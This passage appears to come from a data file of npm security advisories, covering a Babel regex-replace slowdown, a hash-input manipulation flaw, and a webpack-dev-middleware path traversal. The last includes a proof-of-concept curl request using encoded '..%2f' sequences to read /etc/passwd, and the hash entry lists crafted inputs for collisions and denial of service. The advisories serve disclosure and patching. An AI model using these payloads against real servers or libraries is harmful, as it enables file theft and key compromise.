browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$\u003c` if it's then not followed by `\u003e` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",

              "details": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$\u003c` if it's then not followed by `\u003e` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",

Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)",

It is possible to access any file on the developer's machine._\n\n### Details\nThe middleware can either work with the physical filesystem when reading the files or it can use a virtualized in-memory _memfs_ filesystem.\nIf _writeToDisk_ configuration option is set to **true**, the physical filesystem is used:\n[https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/setupOutputFileSystem.js#L21](https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/setupOutputFileSystem.js#L21)\n\nThe _**getFilenameFromUrl**_ method is used to parse URL and build the local file path.\nThe public path prefix is stripped from the URL, and the **unsecaped** path suffix is appended to the _outputPath_:\n[https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/getFilenameFromUrl.js#L82](https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/getFilenameFromUrl.js#L82)\nAs the URL is not unescaped and normalized automatically before calling the midlleware, it is possible to use _%2e_ and _%2f_ sequences to perform path traversal attack.\n\n### PoC\n_A blank project can be created containing the following configuration file **webpack.config.js**:_\n`module.exports = {\n  devServer: {\n    devMiddleware: {\n      writeToDisk: true\n    }\n  }\n};\n`\n\nWhen started, it is possible to access any local file, e.g. _/etc/passwd_:\n`$ curl localhost:8080/public/..%2f..%2f..%2f..%2f../etc/passwd`\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\n```\n\n### Impact\nThe developers using _webpack-dev-server_ or _webpack-dev-middleware_ are affected by the issue. When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content (e.g. password, configuration files, private source code, ...).\n\nIf the development server is listening on a public IP address (or **0.0.0.0**), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port).\n\nIf the server allows access from third-party domains (CORS, **_Allow-Access-Origin: *_** ), an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files.\n\n### Recommendation\nThe URL should be unescaped and normalized before any further processing.",
